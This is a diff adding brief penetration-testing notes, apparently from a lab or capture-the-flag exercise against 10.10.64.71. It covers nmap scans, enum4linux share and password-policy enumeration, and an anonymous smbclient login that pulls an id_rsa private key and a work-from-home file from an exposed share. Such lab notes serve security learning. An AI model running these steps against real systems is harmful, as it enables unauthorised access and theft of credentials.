@@ -1,0 +1,22 @@
+# nmap port scanning for checking open ports/services running on the target machine
+nmap -sT 10.10.64.71
+nmap -sT -A 10.10.64.71
+
+# running a full basic enumeration
+enum4linux -a 10.10.64.71 (all info)
+enum4linux -S 10.10.64.71 (share info)
+```
+[+] Attempting to nmap shares on 10.10.64.71
+..
+..
+//10.10.64.71/profiles Mapping: OK, Listing: OK
+..
+```
+enum4linux -P 10.10.64.71 (password policy info)
+
+# smbclient
+smbclient 10.10.64.71 -U Anonymous -p 445
+smb> cd .ssh
+smb> ls
+smb> mget "id_rsa" id_rsa
+smb> mget "Work From Home Information.txt" WFH.txt
